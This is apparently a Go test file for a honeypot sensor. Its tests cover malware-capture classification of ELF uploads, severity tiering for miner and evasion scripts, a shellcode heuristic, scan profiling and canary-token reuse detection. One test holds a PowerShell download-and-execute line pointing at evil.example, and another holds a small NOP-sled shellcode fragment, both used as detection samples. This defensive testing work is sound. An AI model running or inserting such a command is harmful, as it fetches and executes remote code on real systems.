package sensor

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/rom/tarpit-honeypot/internal/artifactscan"
	"github.com/rom/tarpit-honeypot/internal/event"
	"github.com/rom/tarpit-honeypot/internal/payload"
	"github.com/rom/tarpit-honeypot/internal/scananalysis"
	"github.com/rom/tarpit-honeypot/internal/tokentrack"
)

func hasAnomaly(ev *event.Event, want string) bool {
	for _, a := range ev.Anomalies {
		if a == want {
			return true
		}
	}
	return false
}

// A magic-confirmed executable in the captured payload yields a
// Critical malware:capture event and enriches the source event.
func TestObservePayloadELFCritical(t *testing.T) {
	s := &Sensor{name: "t"} // payloads nil: classify + emit, don't persist
	elf := append([]byte{0x7f, 'E', 'L', 'F', 2, 1, 1, 0}, bytes.Repeat([]byte{0}, 64)...)
	ev := &event.Event{ID: "e1", RuleID: "listener:http", Handler: "http", Proto: "tcp", Source: event.Endpoint{IP: "1.2.3.4"}}
	mw := s.observePayload(ev, elf)
	if mw == nil {
		t.Fatal("expected a malware:capture event")
	}
	if mw.RuleID != "malware:capture" || mw.Severity != event.SeverityCritical {
		t.Errorf("got rule=%q sev=%v; want malware:capture/critical", mw.RuleID, mw.Severity)
	}
	if !hasAnomaly(ev, "payload-elf") {
		t.Errorf("source event not enriched with payload-elf: %v", ev.Anomalies)
	}
	if ev.Meta["payload_artifacts"] == nil {
		t.Error("payload_artifacts meta missing")
	}
}

// A web-style upload (a binary wrapped in a multipart/form-data body, so its
// magic is not at offset 0) is still extracted and persisted to the payloads
// directory — i.e. it shows up on the captures page like an FTP upload.
func TestObservePayloadPersistsEmbeddedUpload(t *testing.T) {
	dir := t.TempDir()
	store, err := payload.NewStore(filepath.Join(dir, "payloads"), 0, 0)
	if err != nil {
		t.Fatal(err)
	}
	s := &Sensor{name: "t", payloads: store}
	elf := append([]byte{0x7f, 'E', 'L', 'F', 2, 1, 1, 0}, bytes.Repeat([]byte{0x42}, 96)...)
	body := []byte("POST /upload HTTP/1.1\r\nContent-Type: multipart/form-data; boundary=b\r\n\r\n" +
		"--b\r\nContent-Disposition: form-data; name=\"f\"; filename=\"x\"\r\n\r\n")
	body = append(append(body, elf...), []byte("\r\n--b--\r\n")...)
	ev := &event.Event{ID: "w1", RuleID: "listener:http", Handler: "http", Proto: "tcp", Source: event.Endpoint{IP: "1.2.3.4"}}
	if mw := s.observePayload(ev, body); mw == nil {
		t.Fatal("expected a malware:capture for the embedded upload")
	}
	files, _ := filepath.Glob(filepath.Join(dir, "payloads", "*.elf"))
	if len(files) != 1 {
		t.Fatalf("embedded upload not persisted to payloads dir: %v", files)
	}
	if !hasAnomaly(ev, "payload-embedded") {
		t.Errorf("payload-embedded anomaly missing: %v", ev.Anomalies)
	}
}

// End-to-end: with a real payload.Store wired in, a captured executable is
// actually written to <data_dir>/payloads/<sha256>.elf, the on-disk filename is
// recorded in the source event's payload_artifacts descriptor, and the file is
// what the captures page lists. This exercises the full collection path the
// observe_payload-nil tests above deliberately skip.
func TestObservePayloadPersistsToDisk(t *testing.T) {
	dir := t.TempDir()
	store, err := payload.NewStore(filepath.Join(dir, "payloads"), 0, 0)
	if err != nil {
		t.Fatal(err)
	}
	s := &Sensor{name: "t", payloads: store}

	elf := append([]byte{0x7f, 'E', 'L', 'F', 2, 1, 1, 0}, bytes.Repeat([]byte{0x42}, 128)...)
	ev := &event.Event{ID: "e1", RuleID: "listener:http", Handler: "http", Proto: "tcp", Source: event.Endpoint{IP: "1.2.3.4"}}
	mw := s.observePayload(ev, elf)
	if mw == nil || mw.RuleID != "malware:capture" {
		t.Fatalf("expected malware:capture; got %v", mw)
	}

	// A <sha256>.elf file landed on disk under the payloads directory.
	files, err := filepath.Glob(filepath.Join(dir, "payloads", "*.elf"))
	if err != nil {
		t.Fatal(err)
	}
	if len(files) != 1 {
		t.Fatalf("expected exactly one persisted .elf artifact, got %v", files)
	}
	if got, _ := os.ReadFile(files[0]); !bytes.Equal(got, elf) {
		t.Errorf("persisted bytes differ from captured payload (len %d vs %d)", len(got), len(elf))
	}

	// The source event's descriptor names the on-disk file ("<kind>:<sha> -> <name>").
	descs, _ := ev.Meta["payload_artifacts"].([]string)
	if len(descs) == 0 || !strings.Contains(descs[0], " -> "+filepath.Base(files[0])) {
		t.Errorf("payload_artifacts descriptor missing on-disk filename: %v", descs)
	}
}

// Per-rule severity tiering: a captured script that trips only a trait rule
// tagged severity=medium stays at the High baseline, while one that trips a
// critical (default) rule is elevated to Critical.
func TestObservePayloadSeverityTiering(t *testing.T) {
	dir := t.TempDir()
	store, err := payload.NewStore(filepath.Join(dir, "payloads"), 0, 0)
	if err != nil {
		t.Fatal(err)
	}
	s := &Sensor{name: "t", payloads: store, artScanner: artifactscan.NewEngine()}

	// Sandbox_Evasion is tagged severity=medium → does not force Critical.
	med := []byte("#!/usr/bin/perl\n# detect IsDebuggerPresent and vmware guest\n")
	ev := &event.Event{ID: "e1", RuleID: "listener:ftp", Handler: "ftp", Proto: "tcp", Source: event.Endpoint{IP: "1.2.3.4"}}
	mw := s.observePayload(ev, med)
	if mw == nil {
		t.Fatal("expected a malware:capture for the evasion script")
	}
	if mw.Severity != event.SeverityHigh {
		t.Errorf("medium-tagged trait match severity = %v; want high baseline", mw.Severity)
	}

	// XMRig_Miner is critical (default) → elevates to Critical.
	crit := []byte("#!/usr/bin/perl\n# launches xmrig randomx miner\n")
	ev2 := &event.Event{ID: "e2", RuleID: "listener:ftp", Handler: "ftp", Proto: "tcp", Source: event.Endpoint{IP: "1.2.3.4"}}
	mw2 := s.observePayload(ev2, crit)
	if mw2 == nil {
		t.Fatal("expected a malware:capture for the miner script")
	}
	if mw2.Severity != event.SeverityCritical {
		t.Errorf("critical-default match severity = %v; want critical", mw2.Severity)
	}
}

// The shellcode heuristic stays High (not Critical) to avoid alert
// fatigue from the occasional binary-protocol false positive.
func TestObservePayloadShellcodeHigh(t *testing.T) {
	s := &Sensor{name: "t"}
	sled := append(bytes.Repeat([]byte{0x90}, 32), 0x31, 0xc0, 0xcd, 0x80)
	ev := &event.Event{ID: "e2", RuleID: "listener:raw", Proto: "tcp", Source: event.Endpoint{IP: "1.2.3.4"}}
	mw := s.observePayload(ev, sled)
	if mw == nil {
		t.Fatal("expected a malware:capture event for shellcode")
	}
	if mw.Severity != event.SeverityHigh {
		t.Errorf("shellcode severity = %v; want high", mw.Severity)
	}
}

// IOCs typed into the emulated shell (not in the connection payload) are
// harvested from the command meta; no artifact => no separate event.
func TestObservePayloadHarvestsShellURLs(t *testing.T) {
	s := &Sensor{name: "t"}
	ev := &event.Event{
		ID: "e3", RuleID: "listener:ssh", Handler: "ssh_interactive", Source: event.Endpoint{IP: "1.2.3.4"},
		Meta: map[string]any{"shell_commands": []string{
			"IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')",
		}},
	}
	if mw := s.observePayload(ev, nil); mw != nil {
		t.Errorf("URL-only finding should not emit a malware event; got %v", mw.RuleID)
	}
	urls, _ := ev.Meta["harvested_urls"].([]string)
	if len(urls) == 0 || urls[0] != "http://evil.example/a.ps1" {
		t.Errorf("shell-command URL not harvested: %v", ev.Meta["harvested_urls"])
	}
}

func TestObservePayloadBenignNoEvent(t *testing.T) {
	s := &Sensor{name: "t"}
	ev := &event.Event{ID: "e4", RuleID: "listener:http", Source: event.Endpoint{IP: "1.2.3.4"}}
	req := []byte("GET / HTTP/1.1\r\nHost: x\r\n\r\n")
	if mw := s.observePayload(ev, req); mw != nil {
		t.Errorf("benign request should not emit malware:capture; got %v", mw)
	}
}

// observeScan emits a scananalysis:profile once a source crosses the
// connection threshold.
func TestObserveScanEmitsProfile(t *testing.T) {
	s := &Sensor{name: "t", scanTrack: scananalysis.NewTracker(5 * time.Minute)}
	base := time.Unix(1_700_000_000, 0)
	ports := []int{80, 443, 22, 21, 8080, 3306}
	var got *event.Event
	for i := 0; i < scananalysis.MinConnsForVerdict; i++ {
		ev := &event.Event{
			RuleID: "listener:bait", Handler: "http", Proto: "tcp",
			Source: event.Endpoint{IP: "203.0.113.9"}, Dest: event.Endpoint{Port: ports[i]},
			Time: base.Add(time.Duration(i) * 40 * time.Millisecond),
		}
		if e := s.observeScan(ev, nil); e != nil {
			got = e
		}
	}
	if got == nil || got.RuleID != "scananalysis:profile" {
		t.Fatalf("expected scananalysis:profile; got %v", got)
	}
	if got.Meta["distinct_ports"] != len(ports) {
		t.Errorf("distinct_ports = %v; want %d", got.Meta["distinct_ports"], len(ports))
	}
}

// Non-listener events are ignored by scan analysis.
func TestObserveScanIgnoresNonListener(t *testing.T) {
	s := &Sensor{name: "t", scanTrack: scananalysis.NewTracker(time.Minute)}
	ev := &event.Event{RuleID: "device:new", Source: event.Endpoint{IP: "203.0.113.9"}}
	if e := s.observeScan(ev, nil); e != nil {
		t.Errorf("non-listener event should be ignored; got %v", e)
	}
}

func TestObserveTokensDetectsReuse(t *testing.T) {
	s := &Sensor{name: "t", tokenTrack: tokentrack.New(0)}
	t0 := time.Now().UTC()

	// 1) Serve a synthetic vault token to attacker A — recorded, no finding.
	served := &event.Event{
		Time: t0, RuleID: "listener:vault:request", Handler: "vault",
		Source: event.Endpoint{IP: "203.0.113.10"},
		Meta:   map[string]any{"vault_token": "Kp9mZq3vR7wLs1xN"},
	}
	if tu := s.observeTokens(served); tu != nil {
		t.Fatalf("serving a token should not itself fire token_used: %+v", tu)
	}

	// 2) Later, attacker B authenticates somewhere using that exact token.
	reused := &event.Event{
		Time: t0.Add(time.Hour), RuleID: "listener:ssh:auth", Handler: "ssh",
		Source: event.Endpoint{IP: "198.51.100.4"},
		Meta:   map[string]any{"auth_password": "Kp9mZq3vR7wLs1xN"},
	}
	tu := s.observeTokens(reused)
	if tu == nil {
		t.Fatal("reuse of a served token should fire canary:token_used")
	}
	if tu.RuleID != "canary:token_used" || tu.Severity != event.SeverityCritical {
		t.Errorf("wrong finding: rule=%s sev=%v", tu.RuleID, tu.Severity)
	}
	if tu.Meta["minted_handler"] != "vault" {
		t.Errorf("mint context lost: %+v", tu.Meta)
	}
}

func TestObserveTokensIgnoresSameConnectionEcho(t *testing.T) {
	s := &Sensor{name: "t", tokenTrack: tokentrack.New(0)}
	t0 := time.Now().UTC()
	// An event that both serves and (in the same connection/time) echoes the
	// token must not self-trigger.
	ev := &event.Event{
		Time: t0, RuleID: "listener:vault:request", Handler: "vault",
		Source: event.Endpoint{IP: "203.0.113.10"},
		Meta:   map[string]any{"vault_token": "Kp9mZq3vR7wLs1xN", "auth_password": "Kp9mZq3vR7wLs1xN"},
	}
	if tu := s.observeTokens(ev); tu != nil {
		t.Errorf("same-connection echo should not fire token_used: %+v", tu)
	}
}
